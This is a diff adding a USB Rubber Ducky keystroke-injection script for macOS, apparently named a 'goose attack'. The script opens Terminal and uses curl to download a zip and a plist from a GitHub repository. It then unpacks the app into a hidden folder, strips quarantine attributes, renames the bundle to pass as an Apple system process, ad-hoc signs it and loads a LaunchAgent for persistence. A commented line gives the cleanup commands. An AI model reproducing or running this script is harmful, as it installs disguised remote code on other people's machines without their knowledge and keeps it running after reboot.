@@ -1,0 +1,30 @@
+
+DEFAULTDELAY 100
+
+DELAY 200
+
+REM Open Terminal
+COMMAND SPACE
+STRING terminal
+ENTER
+DELAY 400
+
+REM Download the file
+STRING curl -L -o /tmp/mac_goose.zip https://github.com/Gallus17/goose-attack/raw/refs/heads/main/mac_goose.zip
+ENTER
+
+REM Extract, rename, and execute in background
+STRING unzip -o /tmp/mac_goose.zip -d ~/.sysmond_config && xattr -cr ~/.sysmond_config/temp/"SysmondAssist.app" && chmod -R 755 ~/.sysmond_config/"SysmondAssist.app" && /usr/libexec/PlistBuddy -c "Set :CFBundleName 'com.apple.SysmondAssist-LJk4Qbrnf'" ~/.sysmond_config/"SysmondAssist.app"/Contents/Info.plist && codesign --force --deep --sign - ~/.sysmond_config/"SysmondAssist.app"
+ENTER
+
+STRING curl -L -o /tmp/com.user.assetjob.plist https://github.com/Gallus17/goose-attack/raw/refs/heads/main/com.user.assetjob.plist
+ENTER
+
+STRING mv /tmp/com.user.assetjob.plist ~/Library/LaunchAgents/ && launchctl load ~/Library/LaunchAgents/com.user.assetjob.plist && launchctl list | grep assetjob
+ENTER
+
+REM killall com.apple.SysmondAssist-LJk4Qbrnf; rm -rf ~/.sysmond_config && launchctl unload ~/Library/LaunchAgents/com.user.assetjob.plist && rm ~/Library/LaunchAgents/com.user.assetjob.plist
+
+
+
+
